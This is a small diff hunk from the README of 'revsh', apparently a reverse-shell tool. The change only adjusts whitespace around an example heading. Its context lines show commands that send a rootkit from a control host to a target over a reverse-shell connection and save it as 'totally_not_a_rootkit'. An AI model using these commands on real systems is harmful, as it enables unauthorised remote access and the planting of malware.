@@ -78,8 +78,8 @@ _revsh_ was developed on x86_64 Linux. Here is a brief list of Arch / OS combina
 		  local controller host:  cat ~/bin/rootkit | revsh -n -c 192.168.0.42:443
 		  remote target host:     revsh 192.168.0.42:443 > ./totally_not_a_rootkit
 		
-	
-	## Example ##
+
+## Example ##
 
 First, setup the local host to be the control host:
 
